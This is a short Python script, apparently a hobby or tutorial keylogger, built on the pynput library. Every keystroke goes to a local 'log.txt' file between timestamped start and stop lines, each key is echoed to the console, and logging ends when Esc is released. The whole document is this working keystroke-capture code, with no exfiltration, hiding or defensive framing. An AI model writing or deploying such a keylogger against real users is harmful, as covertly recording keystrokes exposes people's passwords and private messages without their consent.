import pynput

from pynput.keyboard import Key, Listener
import time


count = 0
keys = []
start= time.ctime()
with open('log.txt','a') as x:
    x.write('\nStart time:'+str(start)+'\n\n')

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed at ".format(key)+str(time.ctime()))
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space")>0:
                f.write(" ")
            elif k.find("enter")>0:
                f.write("\n")
            else:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        stop=time.ctime()
        with open('log.txt','a') as x:
            x.write('\n\nStop Time:'+str(stop)+'\n')
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
